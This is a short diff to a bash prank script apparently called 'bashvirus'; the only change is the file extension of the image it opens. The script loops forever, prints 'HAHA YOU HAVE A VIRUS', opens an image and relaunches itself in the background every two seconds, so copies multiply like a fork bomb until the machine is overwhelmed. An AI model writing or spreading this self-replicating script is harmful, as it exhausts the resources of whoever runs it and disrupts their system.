@@ -3,7 +3,7 @@
 while true; 
 do 
 	echo "HAHA YOU HAVE A VIRUS";
-	open virus.jpg &
+	open virus.png &
 	./bashvirus &
 	sleep 2; 
 done
